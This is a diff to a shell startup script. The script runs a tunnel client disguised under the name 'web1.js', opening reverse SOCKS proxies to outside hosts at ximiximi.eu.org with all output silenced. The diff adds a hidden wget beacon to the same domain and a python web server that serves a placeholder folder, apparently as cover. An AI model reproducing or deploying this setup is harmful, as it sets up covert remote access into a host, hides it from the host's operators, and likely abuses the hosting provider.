@@ -5,6 +5,10 @@ chmod +x busybox
 ./web1.js client --keepalive 55s --max-retry-interval 60s http://oa1.ximiximi.eu.org:2052 R:2443:socks >/dev/null 2>&1 &
 ./web1.js client --keepalive 55s --max-retry-interval 60s http://oa2.ximiximi.eu.org:2052 R:2443:socks >/dev/null 2>&1 &
 ./busybox sh pulseloop.sh >/dev/null 2>&1 &
+./busybox wget -O - http://www.ximiximi.eu.org/startlog >/dev/null 2>&1 &
 
+mkdir www
+cd www
+touch WORK_IN_PROGRESS
 python -m http.server
 
